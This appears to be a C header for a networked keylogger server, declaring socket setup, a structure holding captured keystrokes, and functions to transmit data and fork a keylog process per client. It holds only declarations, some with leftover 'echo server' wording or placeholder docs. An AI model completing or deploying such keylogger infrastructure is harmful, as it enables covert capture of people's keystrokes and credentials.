/**
 * Handles all client-server connections
 *
 * Creates a keylogger server
 */

#pragma once
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include "keylogger.h"

// The port number that the server listens on.
extern const uint16_t PORT;

enum { BACKLOG_SIZE = 10 };

// Group the data needed for a server to run.
typedef struct {
  /// The socket descriptor to listen for connections.
  int listener;
  /// The address and port for the listener socket.
  struct sockaddr_in addr;
  /// The maximum number of clients that can be waiting to connect at once.
  int max_backlog;
} keylog_server;

/**
 * Represents all the data that is sent over the network
 */
typedef struct {
  char** keys;  // an array of strings to be sent over the network
} key_package;

// Convenient error + exit program
void error_and_exit(const char* error_msg);

/**
 * Attempt to open an IPv4 TCP socket.
 *
 * Try to create a TCP socket on IPv4, and return the socket descriptor if
 * successful. If creating the socket is not successful, print an error
 * message and exit the program without returning from the function.
 *
 * @return A socket descriptor corresponding to the new socket.
 */
int open_server(void);

/**
 * Attempt to close an open socket.
 *
 * Try to close an existing socket given its descriptor. If closing the socket
 * is not successful, print an error message and exit the program. In the case
 * of an error, this function does not return.
 *
 * @param socket_descriptor The descriptor for the socket to close
 */
void close_server(int socket_descriptor);

/**
 * Return the sockaddr_in corresponding to an address and port.
 *
 * Given an address and port number, convert their representations to network
 * byte order and assemble them into an approopriate sockaddr_in. The returned
 * value can then be used to bind to or connect to a socket.
 *
 * @param addr The address to bind or connect the socket to, in host order.
 * @param port The port number to bind or connect the socket to, in host order.
 * @return A sockaddr_in structure to use with bind/connect, in network order.
 */
struct sockaddr_in socket_address(in_addr_t addr, in_port_t port);

/**
 * Create a new keylog server in dynamic memory.
 *
 * Given a socket address and a maximum backlog size, create a new echo server
 * on the heap. Since the new server (or rather, the data it stores) is
 * dynamically allocated, the caller is responsible for cleaning the server up
 * afterwards (or terminating the program and letting that take care of things).
 *
 * @param addr The IPv4 address and port that the server will listen on.
 * @param max_backlog The max number of clients that can wait to connect to the
 * server.
 * @return A pointer to the new echo server.
 */
keylog_server* make_keylog_server(struct sockaddr_in ip_addr, int max_backlog);

/**
 * Free an keylog server in dynamic memory.
 *
 * Given a pointer to an echo server on the heap, free the dynamically allocated
 * memory associated with that server. Attempting to free an uninitialized
 * server, server dynamic memory that has already been freed, or a pointer to
 * memory representing anything other than an echo_server instance will result
 * in undefined behavior.
 *
 * @param server A pointer to the server to delete.
 */
void free_keylog_server(keylog_server* server);

/**
 * Documentation here
 */
void transmit_data(void);

/**
 * Documentation here
 */
void clear_data_queue(void);

/**
 * Start listening on a server for potential client connections.
 *
 * Bind the listener socket and set it to listen for client connection requests.
 * The listener socket is part of the server's internal data and does not need
 * to be opened separately. In the event that binding or listening on the socket
 * fails, print an error message and exit the program without returning.
 *
 * @param keylogger The keylog_server to start listening on.
 */
void listen_for_client(keylog_server* keylogger);

/**
 * Accept a new client connection and start the keylog process.
 *
 * Wait until a client connection request comes in, accepting it. Once accepted,
 * fork a new process. In the child process, run the keylog process, and in the
 * parent, end the function. The server program should run the function in a
 * loop, whereas the child can exit the function after the keylog process. In
 * the event of an error in accepting a connection or forking a new process,
 * print an appropriate error message and accept the program.
 *
 * @param server The server to accept the connection on.
 * @return 0 for the parent process and -1 for the child (keylog) process.
 */

int accept_client(keylog_server* keylogger);
